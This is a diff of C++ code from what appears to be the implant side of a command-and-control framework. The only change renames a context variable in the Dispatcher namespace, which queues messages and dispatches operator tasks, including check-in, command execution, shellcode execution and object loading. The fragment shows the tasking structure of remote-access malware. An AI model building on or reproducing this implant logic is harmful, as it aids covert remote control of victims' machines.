@@ -13,10 +13,10 @@ namespace Dispatcher {
     VOID AddMessage(_stream *out) {
         HEXANE;
 
-        auto head = Ctx->transport.message_queue;
+        auto head = ctx->transport.message_queue;
 
-        if (!Ctx->transport.message_queue) {
-            Ctx->transport.message_queue = out;
+        if (!ctx->transport.message_queue) {
+            ctx->transport.message_queue = out;
         }
         else {
             while (head->next) {
@@ -32,17 +32,17 @@ namespace Dispatcher {
 
         _stream *prev = { };
 
-        if (!Ctx->transport.message_queue || !target) {
+        if (!ctx->transport.message_queue || !target) {
             return;
         }
 
-        for (auto head = Ctx->transport.message_queue; head; head = head->next) {
+        for (auto head = ctx->transport.message_queue; head; head = head->next) {
             if (head == target) {
                 if (prev) {
                     prev->next = head->next;
                 }
                 else {
-                    Ctx->transport.message_queue = head->next;
+                    ctx->transport.message_queue = head->next;
                 }
 
                 DestroyStream(head);
@@ -125,7 +125,7 @@ namespace Dispatcher {
 
         _parser parser = { };
 
-        for (auto head = Ctx->transport.message_queue; head; head = head->next) {
+        for (auto head = ctx->transport.message_queue; head; head = head->next) {
             if (head->buffer) {
                 CreateParser(&parser, B_PTR(head->buffer), head->length);
 
@@ -150,7 +150,7 @@ namespace Dispatcher {
         HEXANE;
 
         if (in) {
-            if (PeekPeerId(in) != Ctx->session.peer_id) {
+            if (PeekPeerId(in) != ctx->session.peer_id) {
                 MessageQueue(in);
             }
             else {
@@ -158,7 +158,7 @@ namespace Dispatcher {
             }
         }
         else {
-            auto head = Ctx->transport.message_queue;
+            auto head = ctx->transport.message_queue;
             while (head) {
                 head->ready = FALSE;
                 head = head->next;
@@ -174,7 +174,7 @@ namespace Dispatcher {
         _stream *in     = { };
 
     retry:
-        if (!Ctx->transport.message_queue) {
+        if (!ctx->transport.message_queue) {
             if (ROOT_NODE) {
                 MessageQueue(CreateStreamWithHeaders(TypeTasking));
                 goto retry;
@@ -216,10 +216,10 @@ namespace Dispatcher {
         UnpackUint32(&parser);
 
         auto task_id = UnpackUint32(&parser);
-        MemCopy(&Ctx->session.current_taskid, &task_id, sizeof(uint32_t));
+        MemCopy(&ctx->session.current_taskid, &task_id, sizeof(uint32_t));
 
         switch (UnpackUint32(&parser)) {
-            case TypeCheckin:   MemSet(&Ctx->session.checkin, true, sizeof(bool)); break;
+            case TypeCheckin:   MemSet(&ctx->session.checkin, true, sizeof(bool)); break;
             case TypeTasking:   ExecuteCommand(parser); break;
             case TypeExecute:   ExecuteShellcode(parser); break;
             case TypeObject:    LoadObject(parser); break;
